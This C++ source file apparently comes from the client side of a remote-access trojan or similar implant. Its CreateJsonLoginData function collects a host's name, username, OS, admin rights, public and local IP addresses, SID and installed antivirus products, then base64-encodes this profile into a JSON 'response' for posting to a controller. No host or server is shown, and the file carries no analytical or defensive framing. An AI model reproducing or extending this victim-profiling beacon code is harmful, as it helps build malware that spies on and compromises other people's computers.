#include "JsonFunctions.h"
#include "json/json.h"
using namespace Json;
string JsonFunctions::CreateJsonLoginData(PublicStructers::client clientInfo)
{
	string finalData = "{";
	string ifWifi;
	if (clientInfo.ifWifi)
		ifWifi = "true";
	else
		ifWifi = "false";
	Value finalDataJson;
	Value tempJsonArray;
	finalDataJson["Hostname"] = clientInfo.computer;
	finalDataJson["Username"] = clientInfo.username;
	finalDataJson["Os"] = clientInfo.OS;
	finalDataJson["isAdmin"] = clientInfo.isA;
	finalDataJson["PublicIP"] = clientInfo.globalIp;
	finalDataJson["ifWifi"] = ifWifi;
	finalDataJson["SID"] = clientInfo.sID.c_str();
	if (!clientInfo.IPv4.empty())
	{
		for (string ip : clientInfo.IPv4)
			tempJsonArray.append(ip);
	}
	finalDataJson["IPv4"] = tempJsonArray;
	tempJsonArray = Value::null;	
	if (!clientInfo.listAvs.empty())
	{
		for (string av : clientInfo.listAvs)
			tempJsonArray.append(av);
	}
	finalDataJson["listAvs"] = tempJsonArray;
	finalData = Encryptions::base64Encode(finalDataJson.toStyledString());
	finalData = CreatePostJson(finalData, false, false);
	return finalData;
}

string JsonFunctions::CreatePostJson(string fullData, bool jsonObject, bool encryptionNeeded)
{
	string postData;
	string jsonFormat;
	Value jsonData;
	if (encryptionNeeded) {
		fullData = Encryptions::base64Encode(fullData);
	}
	if (jsonObject)
	{
		jsonData["response"] = "\"" + fullData + "\"";
	}
	else
	{
		jsonData["response"] = fullData;
	}
	return jsonData.toStyledString();
}
